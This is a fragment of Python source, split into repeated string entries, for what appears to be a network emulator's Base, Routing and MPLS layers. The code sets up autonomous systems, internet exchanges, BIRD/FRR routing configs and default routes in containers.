node.insertStartCommand(0, '/interface_setup')\n            node.insertStartCommand(0, 'chmod +x /interface_setup')\n\n    def setNameServers(self, servers: List[str]) -> Base:\n        \"\"\"!\n        @brief set recursive name servers to use on all nodes. Can be override\n        by calling setNameServers at AS level or node level.\n\n        @param servers list of IP addresses of recursive name servers.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__name_servers = servers\n\n        return self\n\n    def getNameServers(self) -> List[str]:\n        \"\"\"!\n        @brief get configured recursive name servers for all nodes.\n\n        @returns list of IP addresses of recursive name servers\n        \"\"\"\n        return self.__name_servers\n\n    def createAutonomousSystem(self, asn: int) -> AutonomousSystem:\n        \"\"\"!\n        @brief Create a new AutonomousSystem.\n\n        @param asn ASN of the new AS.\n        @returns created AS.\n        @throws AssertionError if asn exists.\n        \"\"\"\n        assert asn not in self.__ases, \"as{} already exist.\".format(asn)\n        self.__ases[asn] = AutonomousSystem(asn)\n        return self.__ases[asn]\n\n    def getAutonomousSystem(self, asn: int) -> AutonomousSystem:\n        \"\"\"!\n        @brief Create an existing AutonomousSystem.\n\n        @param asn ASN of the AS.\n        @returns AS.\n        @throws AssertionError if asn does not exist.\n        \"\"\"\n        assert asn in self.__ases, \"as{} does not exist.\".format(asn)\n        return self.__ases[asn]\n\n    def setAutonomousSystem(self, asObject: AutonomousSystem):\n        \"\"\"!\n        @brief Set AS to an existing AS object.\n\n        @param asObject AS object.\n        \"\"\"\n        asn = asObject.getAsn()\n        self.__ases[asn] = asObject\n\n    def createInternetExchange(self, asn: int, prefix: str = \"auto\", aac: AddressAssignmentConstraint = None) -> InternetExchange:\n        \"\"\"!\n        @brief Create a new InternetExchange.\n\n        @param asn ASN of the new IX.\n        @param prefix (optional) prefix of the IX peering LAN.\n        @param aac (optional) Address assignment constraint.\n        @returns created IX.\n        @throws AssertionError if IX exists.\n        \"\"\"\n        assert asn not in self.__ixes, \"ix{} already exist.\".format(asn)\n        self.__ixes[asn] = InternetExchange(asn, prefix, aac)\n        return self.__ixes[asn]\n\n    def getInternetExchange(self, asn: int) -> InternetExchange:\n        \"\"\"!\n        @brief Get an existing InternetExchange.\n\n        @param asn ASN of the IX.\n        @returns InternetExchange.\n        @throws AssertionError if ix does not exist.\n        \"\"\"\n        assert asn in self.__ixes, \"ix{} does not exist.\".format(asn)\n        return self.__ixes[asn]\n\n    def setInternetExchange(self, ixObject: InternetExchange):\n        \"\"\"!\n        @brief Set IX to an existing IX object.\n\n        @param ixObject IX object.\n        \"\"\"\n        asn = ixObject.getId()\n        self.__ixes[asn] = ixObject\n\n    def getAsns(self) -> List[int]:\n        \"\"\"!\n        @brief Get list of ASNs.\n\n        @returns List of ASNs.\n        \"\"\"\n        return list(self.__ases.keys())\n\n    def getInternetExchangeIds(self) -> List[int]:\n        \"\"\"!\n        @brief Get list of IX IDs.\n\n        @returns List of IX IDs.\n        \"\"\"\n        return list(self.__ixes.keys())\n\n    def getNodesByName(self, name:str) -> List[Node]:\n        \"\"\"!\n        @brief Get list of Nodes by name.\n\n        @returns List of Nodes whose name is start with input_name.\n        \"\"\"\n        nodes = []\n        for _as in self.__ases.values():\n            for host_name in _as.getHosts():\n                if host_name.startswith(name):\n                    nodes.append(_as.getHost(host_name))\n        return nodes\n\n    def getNodeByAsnAndName(self, asn:id, name:str) -> Node:\n        _as = self.__ases[asn]\n        node = _as.getHost(name)\n        return node\n\n    def _doCreateGraphs(self, emulator: Emulator):\n        graph = self._addGraph('Layer 2 Connections', False)\n        for asobj in self.__ases.values():\n            asobj.createGraphs(emulator)\n            asgraph = asobj.getGraph('AS{}: Layer 2 Connections'.format(asobj.getAsn()))\n            graph.copy(asgraph)\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'BaseLayer:\\n'\n\n        indent += 4\n        out += ' ' * indent\n        out += 'AutonomousSystems:\\n'\n        for _as in self.__ases.values():\n            out += _as.print(indent + 4)\n\n        out += ' ' * indent\n        out += 'InternetExchanges:\\n'\n        for _as in self.__ixes.values():\n            out += _as.print(indent + 4)\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief Base layer constructor.\n        \"\"\"\n        super().__init__()\n        self.__ases = {}\n        self.__ixes = {}\n        self.__name_servers = []",
  "def getName(self) -> str:\n        return \"Base\"",
  "def configure(self, emulator: Emulator):\n        self._log('registering nodes...')\n        for asobj in self.__ases.values():\n            if len(asobj.getNameServers()) == 0:\n                asobj.setNameServers(self.__name_servers)\n\n            asobj.registerNodes(emulator)\n\n        self._log('setting up internet exchanges...')\n        for ix in self.__ixes.values(): ix.configure(emulator)\n\n        self._log('setting up autonomous systems...')\n        for asobj in self.__ases.values(): asobj.configure(emulator)",
  "def render(self, emulator: Emulator) -> None:\n        for ((scope, type, name), obj) in emulator.getRegistry().getAll().items():\n\n            if type not in ['rs', 'rnode', 'hnode', 'csnode']:\n                continue\n\n            node: Node = obj\n\n            ifinfo = ''\n            for iface in node.getInterfaces():\n                net = iface.getNet()\n                [l, b, d] = iface.getLinkProperties()\n                ifinfo += '{}:{}:{}:{}:{}\\n'.format(net.getName(), net.getPrefix(), l, b, d)\n\n            node.setFile('/ifinfo.txt', ifinfo)\n            node.setFile('/interface_setup', BaseFileTemplates['interface_setup_script'])\n            node.insertStartCommand(0, '/interface_setup')\n            node.insertStartCommand(0, 'chmod +x /interface_setup')",
  "def setNameServers(self, servers: List[str]) -> Base:\n        \"\"\"!\n        @brief set recursive name servers to use on all nodes. Can be override\n        by calling setNameServers at AS level or node level.\n\n        @param servers list of IP addresses of recursive name servers.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__name_servers = servers\n\n        return self",
  "def getNameServers(self) -> List[str]:\n        \"\"\"!\n        @brief get configured recursive name servers for all nodes.\n\n        @returns list of IP addresses of recursive name servers\n        \"\"\"\n        return self.__name_servers",
  "def createAutonomousSystem(self, asn: int) -> AutonomousSystem:\n        \"\"\"!\n        @brief Create a new AutonomousSystem.\n\n        @param asn ASN of the new AS.\n        @returns created AS.\n        @throws AssertionError if asn exists.\n        \"\"\"\n        assert asn not in self.__ases, \"as{} already exist.\".format(asn)\n        self.__ases[asn] = AutonomousSystem(asn)\n        return self.__ases[asn]",
  "def getAutonomousSystem(self, asn: int) -> AutonomousSystem:\n        \"\"\"!\n        @brief Create an existing AutonomousSystem.\n\n        @param asn ASN of the AS.\n        @returns AS.\n        @throws AssertionError if asn does not exist.\n        \"\"\"\n        assert asn in self.__ases, \"as{} does not exist.\".format(asn)\n        return self.__ases[asn]",
  "def setAutonomousSystem(self, asObject: AutonomousSystem):\n        \"\"\"!\n        @brief Set AS to an existing AS object.\n\n        @param asObject AS object.\n        \"\"\"\n        asn = asObject.getAsn()\n        self.__ases[asn] = asObject",
  "def createInternetExchange(self, asn: int, prefix: str = \"auto\", aac: AddressAssignmentConstraint = None) -> InternetExchange:\n        \"\"\"!\n        @brief Create a new InternetExchange.\n\n        @param asn ASN of the new IX.\n        @param prefix (optional) prefix of the IX peering LAN.\n        @param aac (optional) Address assignment constraint.\n        @returns created IX.\n        @throws AssertionError if IX exists.\n        \"\"\"\n        assert asn not in self.__ixes, \"ix{} already exist.\".format(asn)\n        self.__ixes[asn] = InternetExchange(asn, prefix, aac)\n        return self.__ixes[asn]",
  "def getInternetExchange(self, asn: int) -> InternetExchange:\n        \"\"\"!\n        @brief Get an existing InternetExchange.\n\n        @param asn ASN of the IX.\n        @returns InternetExchange.\n        @throws AssertionError if ix does not exist.\n        \"\"\"\n        assert asn in self.__ixes, \"ix{} does not exist.\".format(asn)\n        return self.__ixes[asn]",
  "def setInternetExchange(self, ixObject: InternetExchange):\n        \"\"\"!\n        @brief Set IX to an existing IX object.\n\n        @param ixObject IX object.\n        \"\"\"\n        asn = ixObject.getId()\n        self.__ixes[asn] = ixObject",
  "def getAsns(self) -> List[int]:\n        \"\"\"!\n        @brief Get list of ASNs.\n\n        @returns List of ASNs.\n        \"\"\"\n        return list(self.__ases.keys())",
  "def getInternetExchangeIds(self) -> List[int]:\n        \"\"\"!\n        @brief Get list of IX IDs.\n\n        @returns List of IX IDs.\n        \"\"\"\n        return list(self.__ixes.keys())",
  "def getNodesByName(self, name:str) -> List[Node]:\n        \"\"\"!\n        @brief Get list of Nodes by name.\n\n        @returns List of Nodes whose name is start with input_name.\n        \"\"\"\n        nodes = []\n        for _as in self.__ases.values():\n            for host_name in _as.getHosts():\n                if host_name.startswith(name):\n                    nodes.append(_as.getHost(host_name))\n        return nodes",
  "def getNodeByAsnAndName(self, asn:id, name:str) -> Node:\n        _as = self.__ases[asn]\n        node = _as.getHost(name)\n        return node",
  "def _doCreateGraphs(self, emulator: Emulator):\n        graph = self._addGraph('Layer 2 Connections', False)\n        for asobj in self.__ases.values():\n            asobj.createGraphs(emulator)\n            asgraph = asobj.getGraph('AS{}: Layer 2 Connections'.format(asobj.getAsn()))\n            graph.copy(asgraph)",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'BaseLayer:\\n'\n\n        indent += 4\n        out += ' ' * indent\n        out += 'AutonomousSystems:\\n'\n        for _as in self.__ases.values():\n            out += _as.print(indent + 4)\n\n        out += ' ' * indent\n        out += 'InternetExchanges:\\n'\n        for _as in self.__ixes.values():\n            out += _as.print(indent + 4)\n\n        return out",
  "class Routing(Layer):\n    \"\"\"!\n    @brief The Routing layer.\n\n    This layer provides routing support for routers and hosts. i.e., (1) install\n    BIRD on router nodes and allow BGP/OSPF to work, (2) setup kernel and device\n    protocols, and (3) setup default routes for host nodes.\n\n    When this layer is rendered, two new methods will be added to the router\n    node and can be used by other layers: (1) addProtocol: add new protocol\n    block to BIRD, and (2) addTable: add new routing table to BIRD.\n\n    This layer also assign loopback address for iBGP/LDP, etc., for other\n    protocols to use later and as router id.\n    \"\"\"\n\n    __loopback_assigner: IPv4Network\n    __loopback_pos: int\n\n    def __init__(self, loopback_range: str = '10.0.0.0/16'):\n        \"\"\"!\n        @brief Routing layer constructor.\n\n        @param loopback_range (optional) network range for assigning loopback\n        IP addresses.\n        \"\"\"\n        super().__init__()\n        self.__loopback_assigner = IPv4Network(loopback_range)\n        self.__loopback_pos = 1\n        self.addDependency('Base', False, False)\n\n    def getName(self) -> str:\n        return \"Routing\"\n\n    def __installBird(self, node: Node):\n        \"\"\"!\n        @brief Install bird on node, and handle the bug.\n        \"\"\"\n        # node.addBuildCommand('mkdir -p /usr/share/doc/bird2/examples/')\n        # node.addBuildCommand('touch /usr/share/doc/bird2/examples/bird.conf')\n        # node.addBuildCommand('apt-get update && apt-get install -y --no-install-recommends bird2')\n        node.setBaseSystem(BaseSystem.SEEDEMU_ROUTER)\n\n    def configure(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n        for ((scope, type, name), obj) in reg.getAll().items():\n            if type == 'rs':\n                rs_node: Node = obj\n                self.__installBird(rs_node)\n                rs_node.appendStartCommand('[ ! -d /run/bird ] && mkdir /run/bird')\n                rs_node.appendStartCommand('bird -d', True)\n                self._log(\"Bootstrapping bird.conf for RS {}...\".format(name))\n\n                rs_ifaces = rs_node.getInterfaces()\n                assert len(rs_ifaces) == 1, \"rs node {} has != 1 interfaces\".format(rs_node.getName())\n\n                rs_iface = rs_ifaces[0]\n\n                if not issubclass(rs_node.__class__, Router): rs_node.__class__ = Router\n                rs_node.setFile(\"/etc/bird/bird.conf\", RoutingFileTemplates[\"rs_bird\"].format(\n                    routerId = rs_iface.getAddress()\n                ))\n\n            if type == 'rnode':\n                rnode: Router = obj\n                if not issubclass(rnode.__class__, Router): rnode.__class__ = Router\n\n                self._log(\"Setting up loopback interface for AS{} Router {}...\".format(scope, name))\n\n                lbaddr = self.__loopback_assigner[self.__loopback_pos]\n\n                rnode.appendStartCommand('ip li add dummy0 type dummy')\n                rnode.appendStartCommand('ip li set dummy0 up')\n                rnode.appendStartCommand('ip addr add {}/32 dev dummy0'.format(lbaddr))\n                rnode.setLoopbackAddress(lbaddr)\n                self.__loopback_pos += 1\n\n                self._log(\"Bootstrapping bird.conf for AS{} Router {}...\".format(scope, name))\n\n                self.__installBird(rnode)\n\n                r_ifaces = rnode.getInterfaces()\n                assert len(r_ifaces) > 0, \"router node {}/{} has no interfaces\".format(rnode.getAsn(), rnode.getName())\n\n                ifaces = ''\n                has_localnet = False\n\n                for iface in r_ifaces:\n                    net = iface.getNet()\n                    if net.isDirect():\n                        has_localnet = True\n                        ifaces += RoutingFileTemplates[\"rnode_bird_direct_interface\"].format(\n                            interfaceName = net.getName()\n                        )\n\n                rnode.setFile(\"/etc/bird/bird.conf\", RoutingFileTemplates[\"rnode_bird\"].format(\n                    routerId = rnode.getLoopbackAddress()\n                ))\n\n                rnode.appendStartCommand('[ ! -d /run/bird ] && mkdir /run/bird')\n                rnode.appendStartCommand('bird -d', True)\n\n                if has_localnet: rnode.addProtocol('direct', 'local_nets', RoutingFileTemplates['rnode_bird_direct'].format(interfaces = ifaces))\n\n    def render(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n        for ((scope, type, name), obj) in reg.getAll().items():\n            if type == 'rs' or type == 'rnode':\n                assert issubclass(obj.__class__, Router), 'routing: render: adding new RS/Router after routing layer configured is not currently supported.'\n\n            if type == 'rnode':\n                rnode: Router = obj\n                if issubclass(rnode.__class__, RealWorldRouter):\n                    self._log(\"Sealing real-world router as{}/{}...\".format(rnode.getAsn(), rnode.getName()))\n                    rnode.seal()\n\n            if type in ['hnode', 'csnode']:\n                hnode: Node = obj\n                hifaces: List[Interface] = hnode.getInterfaces()\n                assert len(hifaces) == 1, 'Host {} in as{} has != 1 interfaces'.format(name, scope)\n                hif = hifaces[0]\n                hnet: Network = hif.getNet()\n                rif: Interface = None\n\n                cur_scope = ScopedRegistry(scope, reg)\n                for router in cur_scope.getByType('rnode'):\n                    if rif != None: break\n                    for riface in router.getInterfaces():\n                        if riface.getNet() == hnet:\n                            rif = riface\n                            break\n\n                assert rif != None, 'Host {} in as{} in network {}: no router'.format(name, scope, hnet.getName())\n                self._log(\"Setting default route for host {} ({}) to router {}\".format(name, hif.getAddress(), rif.getAddress()))\n                hnode.appendStartCommand('ip rou del default 2> /dev/null')\n                hnode.appendStartCommand('ip route add default via {} dev {}'.format(rif.getAddress(), rif.getNet().getName()))\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'RoutingLayer: BIRD 2.0.x\\n'\n\n        return out",
  "def __init__(self, loopback_range: str = '10.0.0.0/16'):\n        \"\"\"!\n        @brief Routing layer constructor.\n\n        @param loopback_range (optional) network range for assigning loopback\n        IP addresses.\n        \"\"\"\n        super().__init__()\n        self.__loopback_assigner = IPv4Network(loopback_range)\n        self.__loopback_pos = 1\n        self.addDependency('Base', False, False)",
  "def getName(self) -> str:\n        return \"Routing\"",
  "def __installBird(self, node: Node):\n        \"\"\"!\n        @brief Install bird on node, and handle the bug.\n        \"\"\"\n        # node.addBuildCommand('mkdir -p /usr/share/doc/bird2/examples/')\n        # node.addBuildCommand('touch /usr/share/doc/bird2/examples/bird.conf')\n        # node.addBuildCommand('apt-get update && apt-get install -y --no-install-recommends bird2')\n        node.setBaseSystem(BaseSystem.SEEDEMU_ROUTER)",
  "def configure(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n        for ((scope, type, name), obj) in reg.getAll().items():\n            if type == 'rs':\n                rs_node: Node = obj\n                self.__installBird(rs_node)\n                rs_node.appendStartCommand('[ ! -d /run/bird ] && mkdir /run/bird')\n                rs_node.appendStartCommand('bird -d', True)\n                self._log(\"Bootstrapping bird.conf for RS {}...\".format(name))\n\n                rs_ifaces = rs_node.getInterfaces()\n                assert len(rs_ifaces) == 1, \"rs node {} has != 1 interfaces\".format(rs_node.getName())\n\n                rs_iface = rs_ifaces[0]\n\n                if not issubclass(rs_node.__class__, Router): rs_node.__class__ = Router\n                rs_node.setFile(\"/etc/bird/bird.conf\", RoutingFileTemplates[\"rs_bird\"].format(\n                    routerId = rs_iface.getAddress()\n                ))\n\n            if type == 'rnode':\n                rnode: Router = obj\n                if not issubclass(rnode.__class__, Router): rnode.__class__ = Router\n\n                self._log(\"Setting up loopback interface for AS{} Router {}...\".format(scope, name))\n\n                lbaddr = self.__loopback_assigner[self.__loopback_pos]\n\n                rnode.appendStartCommand('ip li add dummy0 type dummy')\n                rnode.appendStartCommand('ip li set dummy0 up')\n                rnode.appendStartCommand('ip addr add {}/32 dev dummy0'.format(lbaddr))\n                rnode.setLoopbackAddress(lbaddr)\n                self.__loopback_pos += 1\n\n                self._log(\"Bootstrapping bird.conf for AS{} Router {}...\".format(scope, name))\n\n                self.__installBird(rnode)\n\n                r_ifaces = rnode.getInterfaces()\n                assert len(r_ifaces) > 0, \"router node {}/{} has no interfaces\".format(rnode.getAsn(), rnode.getName())\n\n                ifaces = ''\n                has_localnet = False\n\n                for iface in r_ifaces:\n                    net = iface.getNet()\n                    if net.isDirect():\n                        has_localnet = True\n                        ifaces += RoutingFileTemplates[\"rnode_bird_direct_interface\"].format(\n                            interfaceName = net.getName()\n                        )\n\n                rnode.setFile(\"/etc/bird/bird.conf\", RoutingFileTemplates[\"rnode_bird\"].format(\n                    routerId = rnode.getLoopbackAddress()\n                ))\n\n                rnode.appendStartCommand('[ ! -d /run/bird ] && mkdir /run/bird')\n                rnode.appendStartCommand('bird -d', True)\n\n                if has_localnet: rnode.addProtocol('direct', 'local_nets', RoutingFileTemplates['rnode_bird_direct'].format(interfaces = ifaces))",
  "def render(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n        for ((scope, type, name), obj) in reg.getAll().items():\n            if type == 'rs' or type == 'rnode':\n                assert issubclass(obj.__class__, Router), 'routing: render: adding new RS/Router after routing layer configured is not currently supported.'\n\n            if type == 'rnode':\n                rnode: Router = obj\n                if issubclass(rnode.__class__, RealWorldRouter):\n                    self._log(\"Sealing real-world router as{}/{}...\".format(rnode.getAsn(), rnode.getName()))\n                    rnode.seal()\n\n            if type in ['hnode', 'csnode']:\n                hnode: Node = obj\n                hifaces: List[Interface] = hnode.getInterfaces()\n                assert len(hifaces) == 1, 'Host {} in as{} has != 1 interfaces'.format(name, scope)\n                hif = hifaces[0]\n                hnet: Network = hif.getNet()\n                rif: Interface = None\n\n                cur_scope = ScopedRegistry(scope, reg)\n                for router in cur_scope.getByType('rnode'):\n                    if rif != None: break\n                    for riface in router.getInterfaces():\n                        if riface.getNet() == hnet:\n                            rif = riface\n                            break\n\n                assert rif != None, 'Host {} in as{} in network {}: no router'.format(name, scope, hnet.getName())\n                self._log(\"Setting default route for host {} ({}) to router {}\".format(name, hif.getAddress(), rif.getAddress()))\n                hnode.appendStartCommand('ip rou del default 2> /dev/null')\n                hnode.appendStartCommand('ip route add default via {} dev {}'.format(rif.getAddress(), rif.getNet().getName()))",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'RoutingLayer: BIRD 2.0.x\\n'\n\n        return out",
  "class Mpls(Layer, Graphable):\n    \"\"\"!\n    @brief The Mpls (MPLS) layer.\n\n    This layer is a replacement for the iBGP full mesh setup for the transit\n    provider's internal network. Instead of the traditional IP network, which\n    requires every hop to have a copy of the full table, MPLS allows non-edge\n    hops to hold only the MPLS forwarding table, which negated the need for the\n    full table.\n\n    MPLS layer will setup iBGP, LDP, and OSPF. FRRouting will do LDP and OSPF,\n    and BIRD will still do BGP. When installed, the MPLS layer will treat all\n    nodes with (1) no connection to IX and (2) no connection to a network with\n    at least one host node as non-edge nodes and will not put it as part of the\n    iBGP mesh network.\n    \n    The MPLS layer requires kernel modules support. Make sure you load the\n    following modules:\n\n    - mpls_router\n    - mpls_iptunnel\n    - mpls_gso\n\n    Node with MPLS enabled will be privileged. This means the container\n    potentially have full control over the docker host. Be careful when exposing\n    the node to the public.\n    \"\"\"\n\n    __additional_edges: Set[Tuple[int, str]]\n    __enabled: Set[int]\n\n    def __init__(self):\n        \"\"\"!\n        @brief Mpls layer constructor.\n        \"\"\"\n        super().__init__()\n        self.__additional_edges = set()\n        self.__enabled = set()\n\n        # they are not really \"dependency,\" we just need them to render after\n        # us, in case we need to setup masks.\n        self.addDependency('Ospf', True, True)\n        self.addDependency('Ibgp', True, True)\n\n        self.addDependency('Routing', False, False)\n\n    def getName(self) -> str:\n        return 'Mpls'\n\n    def markAsEdge(self, asn: int, nodename: str) -> Mpls:\n        \"\"\"!\n        @brief Mark a router node as edge node.\n\n        By default, only nodes with connection to IX, or connection to a network\n        with at least one host node, will be considered an edge router and be\n        included in the iBGP mesh. Use this method to mark a node as edge\n        manually.\n\n        @param asn asn\n        @param nodename name of node\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__additional_edges.add((asn, nodename))\n\n        return self\n\n    def getEdges(self) -> Set[Tuple[int, str]]:\n        \"\"\"!\n        @brief Get set of router nodes marked as edge.\n\n        @returns set of tuple of asn and node name.\n        \"\"\"\n        return self.__additional_edges\n\n    def enableOn(self, asn: int) -> Mpls:\n        \"\"\"!\n        @brief Use MPLS in an AS.\n\n        MPLS is not enabled by default. Use this method to enable MPLS for an\n        AS. This also automatically setup masks for OSPF and IBGP layer if they\n        exist.\n\n        @param asn ASN.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__enabled.add(asn)\n\n        return self\n\n    def getEnabled(self) -> Set[int]:\n        \"\"\"!\n        @brief Get set of ASNs that has MPLS enabled.\n\n        @return set of ASNs\n        \"\"\"\n        return self.__enabled\n\n    def __getEdgeNodes(self, scope: ScopedRegistry) -> Tuple[List[Node], List[Node]]:\n        \"\"\"!\n        @brief Helper tool - get list of routers (edge, non-edge) of an AS.\n\n        @param scope scope.\n        \"\"\"\n        enodes: List[Node] = []\n        nodes: List[Node] = []\n\n        for obj in scope.getByType('rnode'):\n            node: Node = obj\n\n            is_edge = False\n            for iface in node.getInterfaces():\n                net = iface.getNet()\n                if net.getType() == NetworkType.InternetExchange:\n                    is_edge = True\n                    break\n                if True in (node.getRole() == NodeRole.Host for node in net.getAssociations()):\n                    is_edge = True\n                    break\n\n            if is_edge: enodes.append(node)\n            else: nodes.append(node)\n\n        return (enodes, nodes)\n\n    def __setUpLdpOspf(self, node: Router):\n        \"\"\"!\n        @brief Setup LDP and OSPF on router.\n\n        @param node node.\n        \"\"\"\n        self._log('Setting up LDP and OSPF on as{}/{}'.format(node.getAsn(), node.getName()))\n\n        node.setPrivileged(True)\n        node.addSoftware('frr')\n\n        ospf_ifaces = ''\n        ldp_ifaces = ''\n        mpls_iface_list = []\n\n        # todo mask network from ospf?\n        for iface in node.getInterfaces():\n            net = iface.getNet()\n            if net.getType() == NetworkType.InternetExchange: continue\n            if not (True in (node.getRole() == NodeRole.Router for node in net.getAssociations())): continue\n            ospf_ifaces += MplsFileTemplates['frr_config_ospf_iface'].format(interface = net.getName())\n            ldp_ifaces += MplsFileTemplates['frr_config_ldp_iface'].format(interface = net.getName())\n            mpls_iface_list.append(net.getName())\n            net.setMtu(9000)\n\n        node.setFile('/etc/frr/frr.conf', MplsFileTemplates['frr_config'].format(\n            loopbackAddress = node.getLoopbackAddress(),\n            ospfInterfaces = ospf_ifaces,\n            ldpInterfaces = ldp_ifaces\n        ))\n\n        node.setFile('/frr_start', MplsFileTemplates['frr_start_script'])\n        node.setFile('/mpls_ifaces.txt', '\\n'.join(mpls_iface_list))\n        node.appendStartCommand('chmod +x /frr_start')\n        node.appendStartCommand('/frr_start')\n\n    def __setUpIbgpMesh(self, nodes: List[Router]):\n        \"\"\"!\n        @brief Setup IBGP full mesh.\n\n        @param node list of nodes.\n        \"\"\"\n\n        self._log('Setting up iBGP full mesh for edge nodes...')\n        for local in nodes:\n\n            n = 1\n            for remote in nodes:\n                if local == remote: continue\n\n                local.addTable('t_bgp')\n                local.addTablePipe('t_bgp')\n                local.addTablePipe('t_direct', 't_bgp')\n                local.addProtocol('bgp', 'ibgp{}'.format(n), MplsFileTemplates['bird_ibgp_peer'].format(\n                    localAddress = local.getLoopbackAddress(),\n                    peerAddress = remote.getLoopbackAddress(),\n                    asn = local.getAsn()\n                ))\n\n                n += 1\n\n    def render(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n        for asn in self.__enabled:\n            if reg.has('seedemu', 'layer', 'Ospf'):\n                self._log('Ospf layer exists, masking as{}'.format(asn))\n                ospf: Ospf = reg.get('seedemu', 'layer', 'Ospf')\n                ospf.maskAsn(asn)\n\n            if reg.has('seedemu', 'layer', 'Ibgp'):\n                self._log('Ibgp layer exists, masking as{}'.format(asn))\n                ibgp: Ibgp = reg.get('seedemu', 'layer', 'Ibgp')\n                ibgp.maskAsn(asn)\n\n            scope = ScopedRegistry(str(asn), reg)\n            (enodes, nodes) = self.__getEdgeNodes(scope)\n\n            for (asn_, nodename) in self.__additional_edges:\n                if asn_ != asn: continue\n                if scope.has('rnode', nodename):\n                    enodes.append(scope.get('rnode', nodename))\n\n            for n in enodes: self.__setUpLdpOspf(n)\n            for n in nodes: self.__setUpLdpOspf(n)\n            self.__setUpIbgpMesh(enodes)\n\n    def _doCreateGraphs(self, emulator: Emulator):\n        base = emulator.getRegistry().get('seedemu', 'layer', 'Base')\n        for asn in base.getAsns():\n            if asn not in self.__enabled: continue\n            asobj = base.getAutonomousSystem(asn)\n            asobj.createGraphs(emulator)\n            l2graph = asobj.getGraph('AS{}: Layer 2 Connections'.format(asn))\n            mplsgraph = self._addGraph('AS{}: MPLS Topology'.format(asn), False)\n            mplsgraph.copy(l2graph)\n            for edge in mplsgraph.edges:\n                edge.style = 'dotted'\n\n            scope = ScopedRegistry(str(asn), emulator.getRegistry())\n            (enodes, _) = self.__getEdgeNodes(scope)\n            \n            while len(enodes) > 0:\n                a = enodes.pop()\n                for b in enodes:\n                    mplsgraph.addEdge('Router: {}'.format(a.getName()), 'Router: {}'.format(b.getName()), style = 'solid')\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'MplsLayer:\\n'\n        \n        indent += 4\n        out += ' ' * indent\n        out += 'Enabled on:\\n'\n\n        indent += 4\n        for asn in self.__enabled:\n            out += ' ' * indent\n            out += 'as{}\\n'.format(asn)\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief Mpls layer constructor.\n        \"\"\"\n        super().__init__()\n        self.__additional_edges = set()\n        self.__enabled = set()\n\n        # they are not really \"dependency,\" we just need them to render after\n        # us, in case we need to setup masks.\n        self.addDependency('Ospf', True, True)\n        self.addDependency('Ibgp', True, True)\n\n        self.addDependency('Routing', False, False)",
  "def getName(self) -> str:\n        return 'Mpls'",
  "def markAsEdge(self, asn: int, nodename: str) -> Mpls:\n        \"\"\"!\n        @brief Mark a router node as edge node.\n\n        By default, only nodes with connection to IX, or connection to a network\n        with at least one host node, will be considered an edge router and be\n        included in the iBGP mesh. Use this method to mark a node as edge\n        manually.\n\n        @param asn asn\n        @param nodename name of node\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__additional_edges.add((asn, nodename))\n\n        return self",
  "def getEdges(self) -> Set[Tuple[int, str]]:\n        \"\"\"!\n        @brief Get set of router nodes marked as edge.\n\n        @returns set of tuple of asn and node name.\n        \"\"\"\n        return self.__additional_edges",
  "def enableOn(self, asn: int) -> Mpls:\n        \"\"\"!\n        @brief Use MPLS in an AS.\n\n        MPLS is not enabled by default. Use this method to enable MPLS for an\n        AS. This also automatically setup masks for OSPF and IBGP layer if they\n        exist.\n\n        @param asn ASN.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__enabled.add(asn)\n\n        return self",
  "def getEnabled(self) -> Set[int]:\n        \"\"\"!\n        @brief Get set of ASNs that has MPLS enabled.\n\n        @return set of ASNs\n        \"\"\"\n        return self.__enabled",
  "def __getEdgeNodes(self, scope: ScopedRegistry) -> Tuple[List[Node], List[Node]]:\n        \"\"\"!\n        @brief Helper tool - get list of routers (edge, non-edge) of an AS.\n\n        @param scope scope.\n        \"\"\"\n        enodes: List[Node] = []\n        nodes: List[Node] = []\n\n        for obj in scope.getByType('rnode'):\n            node: Node = obj\n\n            is_edge = False\n            for iface in node.getInterfaces():\n                net = iface.getNet()\n                if net.getType() == NetworkType.InternetExchange:\n                    is_edge = True\n                    break\n                if True in (node.getRole() == NodeRole.Host for node in net.getAssociations()):\n                    is_edge = True\n                    break\n\n            if is_edge: enodes.append(node)\n            else: nodes.append(node)\n\n        return (enodes, nodes)",
  "def __setUpLdpOspf(self, node: Router):\n        \"\"\"!\n        @brief Setup LDP and OSPF on router.\n\n        @param node node.\n        \"\"\"\n        self._log('Setting up LDP and OSPF on as{}/{}'.format(node.getAsn(), node.getName()))\n\n        node.setPrivileged(True)\n        node.addSoftware('frr')\n\n        ospf_ifaces = ''\n        ldp_ifaces = ''\n        mpls_iface_list = []\n\n        # todo mask network from ospf?\n        for iface in node.getInterfaces():\n            net = iface.getNet()\n            if net.getType() == NetworkType.InternetExchange: continue\n            if not (True in (node.getRole() == NodeRole.Router for node in net.getAssociations())): continue\n            ospf_ifaces += MplsFileTemplates['frr_config_ospf_iface'].format(interface = net.getName())\n            ldp_ifaces += MplsFileTemplates['frr_config_ldp_iface'].format(interface = net.getName())\n            mpls_iface_list.append(net.getName())\n            net.setMtu(9000)\n\n        node.setFile('/etc/frr/frr.conf', MplsFileTemplates['frr_config'].format(\n            loopbackAddress = node.getLoopbackAddress(),\n            ospfInterfaces = ospf_ifaces,\n            ldpInterfaces = ldp_ifaces\n        ))\n\n        node.setFile('/frr_start', MplsFileTemplates['frr_start_script'])\n        node.setFile('/mpls_ifaces.txt', '\\n'.join(mpls_iface_list))\n        node.appendStartCommand('chmod +x /frr_start')\n        node.appendStartCommand('/frr_start')",
